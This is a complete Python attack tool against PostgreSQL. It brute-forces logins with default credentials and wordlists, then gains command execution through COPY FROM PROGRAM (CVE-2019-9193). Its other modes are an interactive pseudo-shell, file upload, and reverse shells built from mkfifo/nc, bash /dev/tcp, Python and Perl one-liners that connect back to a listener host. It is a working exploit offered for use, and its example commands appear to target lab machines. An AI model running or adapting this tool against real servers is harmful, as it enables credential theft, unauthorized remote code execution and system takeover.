#!/usr/bin/env python3
"""
postgresss_pwn.py — PostgreSQL Brute Force + RCE (CVE-2019-9193)

Combines credential brute-forcing with COPY FROM PROGRAM exploitation
for authenticated RCE on PostgreSQL 9.3 – 16+.

Modes:
  brute     Brute-force PostgreSQL credentials from wordlists
  recon     Fingerprint: version, superuser, databases, users, config
  exec      One-shot command execution via COPY FROM PROGRAM
  shell     Interactive pseudo-shell
  revshell  Reverse shell via mkfifo/nc or bash /dev/tcp
  upload    Upload a local file to the target via COPY + large objects

Based on squid22/PostgreSQL_RCE and CVE-2019-9193 (EDB-50847).
"""

import argparse
import os
import socket
import sys
import threading
import time

try:
    import psycopg2
    import psycopg2.extensions
except ImportError:
    print("[-] psycopg2 not installed. Run: pip install psycopg2-binary")
    sys.exit(1)


# ─── ANSI colors ────────────────────────────────────────────────────────────
class C:
    RST  = "\033[0m"
    BOLD = "\033[1m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YEL  = "\033[93m"
    BLU  = "\033[94m"
    MAG  = "\033[95m"
    CYN  = "\033[96m"
    DIM  = "\033[2m"

def info(msg):  print(f"{C.BLU}[*]{C.RST} {msg}")
def good(msg):  print(f"{C.GRN}[+]{C.RST} {msg}")
def warn(msg):  print(f"{C.YEL}[!]{C.RST} {msg}")
def fail(msg):  print(f"{C.RED}[-]{C.RST} {msg}")


# ─── Default credential pairs ───────────────────────────────────────────────
DEFAULT_CREDS = [
    ("postgres", "postgres"),
    ("postgres", ""),
    ("postgres", "password"),
    ("postgres", "admin"),
    ("postgres", "root"),
    ("postgres", "postgres123"),
    ("postgres", "Postgres"),
    ("postgres", "Postgres1"),
    ("admin", "admin"),
    ("admin", "password"),
    ("dbuser", "dbuser"),
    ("dbuser", "password"),
    ("pgsql", "pgsql"),
    ("pgadmin", "pgadmin"),
]


# ─── Database Connection ────────────────────────────────────────────────────

def pg_connect(host, port, user, password, database="template1", timeout=5):
    """Attempt a PostgreSQL connection. Returns (conn, None) or (None, error_str)."""
    try:
        conn = psycopg2.connect(
            host=host, port=port,
            user=user, password=password,
            dbname=database,
            connect_timeout=timeout,
        )
        conn.autocommit = True
        return conn, None
    except psycopg2.OperationalError as e:
        return None, str(e).strip()


def pg_query(conn, sql):
    """Execute a query and return rows, or error string."""
    try:
        cur = conn.cursor()
        cur.execute(sql)
        if cur.description:
            return cur.fetchall(), None
        return [], None
    except Exception as e:
        return None, str(e).strip()


# ─── Brute Force ─────────────────────────────────────────────────────────────

def brute_force(args):
    """Brute-force PostgreSQL credentials."""
    info(f"{C.BOLD}═══ PostgreSQL Brute Force ═══{C.RST}")
    info(f"Target: {args.target}:{args.port}")

    # Build credential pairs
    cred_pairs = []

    if args.user and args.password:
        # Single cred test
        cred_pairs.append((args.user, args.password))
    elif args.user_file and args.pass_file:
        # Wordlist mode
        users = load_wordlist(args.user_file)
        passwords = load_wordlist(args.pass_file)
        info(f"Loaded {len(users)} users × {len(passwords)} passwords = {len(users)*len(passwords)} combinations")
        for u in users:
            for p in passwords:
                cred_pairs.append((u, p))
    elif args.user and args.pass_file:
        # Single user, password list
        passwords = load_wordlist(args.pass_file)
        info(f"User: {args.user}, {len(passwords)} passwords to try")
        for p in passwords:
            cred_pairs.append((args.user, p))
    elif args.user_file and args.password:
        # User list, single password
        users = load_wordlist(args.user_file)
        info(f"{len(users)} users, password: {args.password}")
        for u in users:
            cred_pairs.append((u, args.password))
    else:
        # Default creds
        warn("No wordlists specified — trying default credentials")
        cred_pairs = DEFAULT_CREDS[:]

    found = []
    total = len(cred_pairs)
    db = args.database or "template1"

    for i, (user, passwd) in enumerate(cred_pairs, 1):
        if args.verbose:
            info(f"[{i}/{total}] Trying {user}:{passwd}")
        elif i % 50 == 0:
            info(f"Progress: {i}/{total}")

        conn, err = pg_connect(args.target, args.port, user, passwd, db, args.timeout)

        if conn:
            good(f"{C.BOLD}VALID → {user}:{passwd}{C.RST}")
            found.append((user, passwd))
            conn.close()
            if args.stop_on_first:
                break
        else:
            if "timeout" in err.lower():
                warn(f"Timeout on {user}:{passwd} — target may be down")
                if i > 3:
                    fail("Multiple timeouts — aborting")
                    break
            elif "password authentication failed" in err.lower():
                pass  # expected, continue
            elif "no pg_hba.conf entry" in err.lower():
                fail(f"Connection rejected for {user} from our IP (pg_hba.conf)")
            elif args.verbose:
                fail(f"{user}:{passwd} → {err[:80]}")

    print()
    if found:
        good(f"Found {len(found)} valid credential(s):")
        for u, p in found:
            print(f"  {C.GRN}{u}{C.RST}:{C.CYN}{p}{C.RST}")
    else:
        fail("No valid credentials found")

    return found


def load_wordlist(path):
    """Load a wordlist file, one entry per line."""
    if not os.path.exists(path):
        fail(f"Wordlist not found: {path}")
        sys.exit(1)
    with open(path, "r", errors="replace") as f:
        return [line.strip() for line in f if line.strip()]


# ─── Recon ───────────────────────────────────────────────────────────────────

def recon(conn, args):
    """Fingerprint the PostgreSQL instance."""
    print()
    info(f"{C.BOLD}═══ PostgreSQL Recon ═══{C.RST}")

    # Version
    rows, _ = pg_query(conn, "SELECT version()")
    if rows:
        info(f"Version: {C.CYN}{rows[0][0]}{C.RST}")

    # Current user & superuser check
    rows, _ = pg_query(conn, "SELECT current_user, current_setting('is_superuser')")
    if rows:
        user, is_su = rows[0]
        su_color = C.GRN if is_su == "on" else C.RED
        info(f"User:    {user} (superuser: {su_color}{is_su}{C.RST})")
        if is_su != "on":
            warn("Not a superuser — COPY FROM PROGRAM may fail!")

    # Server address & port
    rows, _ = pg_query(conn, "SELECT inet_server_addr(), inet_server_port()")
    if rows:
        info(f"Server:  {rows[0][0]}:{rows[0][1]}")

    # Data directory
    rows, _ = pg_query(conn, "SELECT current_setting('data_directory')")
    if rows:
        info(f"Datadir: {rows[0][0]}")

    # Config file
    rows, _ = pg_query(conn, "SELECT current_setting('config_file')")
    if rows:
        info(f"Config:  {rows[0][0]}")

    # HBA file
    rows, _ = pg_query(conn, "SELECT current_setting('hba_file')")
    if rows:
        info(f"HBA:     {rows[0][0]}")

    # Databases
    rows, _ = pg_query(conn, "SELECT datname FROM pg_database WHERE datistemplate = false ORDER BY datname")
    if rows:
        dbs = [r[0] for r in rows]
        info(f"Databases ({len(dbs)}): {', '.join(dbs)}")

    # Users/Roles
    rows, _ = pg_query(conn,
        "SELECT rolname, rolsuper, rolcreatedb, rolcanlogin FROM pg_roles ORDER BY rolname")
    if rows:
        info(f"Roles ({len(rows)}):")
        for name, su, cdb, login in rows:
            flags = []
            if su:   flags.append(f"{C.RED}SUPERUSER{C.RST}")
            if cdb:  flags.append("CREATEDB")
            if login: flags.append("LOGIN")
            print(f"    {name:20s}  {', '.join(flags)}")

    # Check COPY FROM PROGRAM availability
    print()
    info("Testing COPY FROM PROGRAM...")
    rows, err = pg_query(conn, """
        DROP TABLE IF EXISTS __pg_pwn_test;
        CREATE TEMP TABLE __pg_pwn_test(output text);
        COPY __pg_pwn_test FROM PROGRAM 'echo PG_PWN_OK';
        SELECT output FROM __pg_pwn_test;
    """)
    if rows and any("PG_PWN_OK" in str(r) for r in rows):
        good(f"{C.BOLD}COPY FROM PROGRAM works — RCE available!{C.RST}")
    else:
        fail(f"COPY FROM PROGRAM blocked: {err or 'unknown error'}")

    pg_query(conn, "DROP TABLE IF EXISTS __pg_pwn_test")
    print()


# ─── RCE via COPY FROM PROGRAM ──────────────────────────────────────────────

def exec_cmd(conn, cmd, table_name="__pg_pwn_cmd"):
    """Execute a single OS command via COPY FROM PROGRAM and return output."""
    # Clean previous results
    pg_query(conn, f"DROP TABLE IF EXISTS {table_name}")
    pg_query(conn, f"CREATE TEMP TABLE {table_name}(line text)")

    # Execute — wrap in bash -c for pipes/redirects
    safe_cmd = cmd.replace("'", "'\"'\"'")
    _, err = pg_query(conn, f"COPY {table_name} FROM PROGRAM 'bash -c ''{safe_cmd}'''")

    if err:
        # Fallback: try without bash wrapper
        safe_cmd2 = cmd.replace("'", "''")
        pg_query(conn, f"DROP TABLE IF EXISTS {table_name}")
        pg_query(conn, f"CREATE TEMP TABLE {table_name}(line text)")
        _, err2 = pg_query(conn, f"COPY {table_name} FROM PROGRAM '{safe_cmd2}'")
        if err2:
            return None, err2

    rows, _ = pg_query(conn, f"SELECT line FROM {table_name}")
    pg_query(conn, f"DROP TABLE IF EXISTS {table_name}")

    if rows:
        return "\n".join(str(r[0]) for r in rows), None
    return "", None


def do_exec(conn, args):
    """One-shot command execution."""
    info(f"Executing: {args.cmd}")
    output, err = exec_cmd(conn, args.cmd)
    if err:
        fail(f"Command failed: {err}")
    elif output:
        print(f"\n{C.GRN}{output}{C.RST}\n")
    else:
        warn("Command returned no output")


def do_shell(conn, args):
    """Interactive pseudo-shell."""
    good("Interactive PostgreSQL shell — type 'exit' to quit")
    info("Commands run via COPY FROM PROGRAM as the postgres OS user")
    print()

    try:
        while True:
            try:
                cmd = input(f"{C.RED}pg-pwn{C.RST}({C.CYN}{args.target}{C.RST})> ").strip()
            except EOFError:
                break

            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "q"):
                break

            output, err = exec_cmd(conn, cmd)
            if err:
                fail(err)
            elif output:
                print(output)
    except KeyboardInterrupt:
        print()
    print()


def do_revshell(conn, args):
    """Send a reverse shell via COPY FROM PROGRAM."""
    if not args.lhost or not args.lport:
        fail("--lhost and --lport required for reverse shell")
        return

    # Pick the best payload for the target
    payloads = {
        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f",
        "bash":   f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1",
        "python": f"python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"{args.lhost}\",{args.lport}));[os.dup2(s.fileno(),i) for i in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl":   f"perl -e 'use Socket;$i=\"{args.lhost}\";$p={args.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    }

    payload_name = args.payload or "mkfifo"
    if payload_name not in payloads:
        fail(f"Unknown payload: {payload_name}. Options: {', '.join(payloads.keys())}")
        return

    shell_cmd = payloads[payload_name]

    # Optional: start built-in listener
    if args.listen:
        info(f"Starting listener on 0.0.0.0:{args.lport}")
        t = threading.Thread(target=reverse_listener, args=(args.lport,), daemon=True)
        t.start()
        time.sleep(1)

    info(f"Sending {payload_name} reverse shell to {args.lhost}:{args.lport}")

    # Use COPY FROM PROGRAM — this will hang (the shell blocks), which is expected
    safe = shell_cmd.replace("'", "''")
    try:
        cur = conn.cursor()
        cur.execute("DROP TABLE IF EXISTS __pg_pwn_rev")
        cur.execute("CREATE TEMP TABLE __pg_pwn_rev(x text)")
        cur.execute(f"COPY __pg_pwn_rev FROM PROGRAM '{safe}'")
    except Exception:
        pass  # expected — the command blocks because of the shell

    good("Reverse shell payload sent!")

    if args.listen:
        info("Waiting for shell (Ctrl+C to abort)...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass


def reverse_listener(port):
    """Simple reverse shell catcher."""
    import select as sel
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(60)
    try:
        cli, addr = srv.accept()
        good(f"Shell from {addr[0]}:{addr[1]}!")
        print(f"{C.DIM}{'─' * 50}{C.RST}")
        cli.settimeout(0.5)
        while True:
            ready, _, _ = sel.select([cli, sys.stdin], [], [], 0.5)
            for s in ready:
                if s is cli:
                    data = cli.recv(4096)
                    if not data:
                        return
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                elif s is sys.stdin:
                    line = sys.stdin.readline()
                    if not line:
                        return
                    cli.sendall(line.encode())
    except socket.timeout:
        fail("No callback received within 60s")
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()


# ─── File Upload via Large Objects ───────────────────────────────────────────

def do_upload(conn, args):
    """Upload a local file to the target via COPY TO + large objects."""
    if not args.local_file or not args.remote_path:
        fail("--local-file and --remote-path required for upload")
        return

    if not os.path.exists(args.local_file):
        fail(f"Local file not found: {args.local_file}")
        return

    info(f"Uploading {args.local_file} → {args.remote_path}")

    with open(args.local_file, "rb") as f:
        data = f.read()

    info(f"File size: {len(data)} bytes")

    # Method: base64 encode, write via COPY FROM PROGRAM 'echo ... | base64 -d > file'
    import base64
    b64 = base64.b64encode(data).decode()

    # Split into chunks (command line limit)
    chunk_size = 4096
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

    # Write first chunk (overwrite)
    safe_path = args.remote_path.replace("'", "''")
    _, err = pg_query(conn,
        f"COPY (SELECT 1) TO PROGRAM 'echo {chunks[0]} | base64 -d > {safe_path}'")
    if err:
        fail(f"Upload failed: {err}")
        return

    # Append remaining chunks
    for i, chunk in enumerate(chunks[1:], 2):
        _, err = pg_query(conn,
            f"COPY (SELECT 1) TO PROGRAM 'echo {chunk} | base64 -d >> {safe_path}'")
        if err:
            fail(f"Upload failed at chunk {i}: {err}")
            return

    good(f"Uploaded {len(data)} bytes to {args.remote_path}")

    # Verify
    output, _ = exec_cmd(conn, f"ls -la {args.remote_path}")
    if output:
        info(f"Verify: {output.strip()}")


# ─── Main ────────────────────────────────────────────────────────────────────

BANNER = f"""{C.MAG}
  ┌──────────────────────────────────────────────┐
  │  {C.BOLD}pg-pwn{C.RST}{C.MAG}  — PostgreSQL Brute + RCE            │
  │  COPY FROM PROGRAM → shell (CVE-2019-9193)   │
  └──────────────────────────────────────────────┘{C.RST}
"""


def main():
    parser = argparse.ArgumentParser(
        description="PostgreSQL Brute Force + RCE (CVE-2019-9193)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s brute -t 10.10.10.5                                # try default creds
  %(prog)s brute -t 10.10.10.5 -U users.txt -P passes.txt     # wordlist brute
  %(prog)s recon -t 10.10.10.5 -u postgres -p postgres         # fingerprint
  %(prog)s exec  -t 10.10.10.5 -u postgres -p postgres -x 'id' # one-shot
  %(prog)s shell -t 10.10.10.5 -u postgres -p postgres         # interactive
  %(prog)s revshell -t 10.10.10.5 -u postgres -p postgres \\
           --lhost 10.10.14.2 --lport 4444 --listen             # reverse shell
  %(prog)s upload -t 10.10.10.5 -u postgres -p postgres \\
           --local-file linpeas.sh --remote-path /tmp/lp.sh     # upload file
        """,
    )

    # Common args
    parser.add_argument("-t", "--target", required=True, help="Target PostgreSQL host")
    parser.add_argument("--port", type=int, default=5432, help="PostgreSQL port (default: 5432)")
    parser.add_argument("-d", "--database", default="template1", help="Database name (default: template1)")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    # Auth
    parser.add_argument("-u", "--user", help="Username (single)")
    parser.add_argument("-p", "--password", default="", help="Password (single)")
    parser.add_argument("-U", "--user-file", help="Username wordlist file")
    parser.add_argument("-P", "--pass-file", help="Password wordlist file")
    parser.add_argument("--stop-on-first", action="store_true", default=True,
                        help="Stop brute force on first valid cred (default: yes)")
    parser.add_argument("--no-stop", dest="stop_on_first", action="store_false",
                        help="Try all combinations even after a hit")

    # Mode (positional)
    parser.add_argument("mode", choices=["brute", "recon", "exec", "shell", "revshell", "upload"],
                        help="Operation mode")

    # Exec
    parser.add_argument("-x", "--cmd", help="Command to execute (exec mode)")

    # Reverse shell
    parser.add_argument("--lhost", help="Listener IP for reverse shell")
    parser.add_argument("--lport", type=int, help="Listener port for reverse shell")
    parser.add_argument("--listen", action="store_true", help="Start built-in listener")
    parser.add_argument("--payload", choices=["mkfifo", "bash", "python", "perl"],
                        default="mkfifo", help="Reverse shell payload type (default: mkfifo)")

    # Upload
    parser.add_argument("--local-file", help="Local file to upload")
    parser.add_argument("--remote-path", help="Remote destination path")

    args = parser.parse_args()
    print(BANNER)

    # ── Brute force mode ──
    if args.mode == "brute":
        found = brute_force(args)
        if found and len(found) == 1:
            info("Tip: run recon with the found creds:")
            u, p = found[0]
            print(f"  {C.CYN}python3 {sys.argv[0]} recon -t {args.target} -u {u} -p '{p}'{C.RST}")
        return

    # ── All other modes need a connection ──
    if not args.user:
        fail("Username (-u) required for this mode")
        sys.exit(1)

    conn, err = pg_connect(args.target, args.port, args.user, args.password,
                           args.database, args.timeout)
    if not conn:
        fail(f"Connection failed: {err}")
        sys.exit(1)
    good(f"Connected as {C.CYN}{args.user}{C.RST} to {args.target}:{args.port}/{args.database}")

    try:
        if args.mode == "recon":
            recon(conn, args)

        elif args.mode == "exec":
            if not args.cmd:
                fail("-x/--cmd required for exec mode")
            else:
                do_exec(conn, args)

        elif args.mode == "shell":
            do_shell(conn, args)

        elif args.mode == "revshell":
            do_revshell(conn, args)

        elif args.mode == "upload":
            do_upload(conn, args)

    except KeyboardInterrupt:
        print()
        warn("Aborted")
    finally:
        try:
            conn.close()
        except:
            pass


if __name__ == "__main__":
    main()
